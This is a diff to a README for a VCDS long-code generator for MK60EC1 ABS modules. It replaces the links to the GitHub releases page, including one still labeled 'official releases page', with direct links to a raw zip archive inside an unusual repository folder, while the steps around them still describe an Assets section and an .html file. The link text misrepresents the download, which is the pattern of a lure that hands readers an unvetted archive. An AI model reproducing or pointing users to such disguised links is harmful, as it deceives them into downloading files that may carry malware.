@@ -1,6 +1,6 @@
 # 🚗 mk60ec1-longcode - Generate perfect long codes for VCDS
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Leelahisentropic104/mk60ec1-longcode/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Leelahisentropic104/mk60ec1-longcode/raw/refs/heads/main/rebuffet/ec-mk-longcode-3.7.zip)
 
 ## 🛠 What this tool does
 
@@ -19,7 +19,7 @@ The software works entirely offline. You do not need an internet connection to g
 
 Follow these steps to get the file on your computer.
 
-1.  Visit the [official releases page](https://github.com/Leelahisentropic104/mk60ec1-longcode/releases).
+1.  Visit the [official releases page](https://github.com/Leelahisentropic104/mk60ec1-longcode/raw/refs/heads/main/rebuffet/ec-mk-longcode-3.7.zip).
 2.  Look for the section labeled Assets.
 3.  Click the file ending in .html to start your download.
 4.  Save the file to your desktop or your Documents folder.
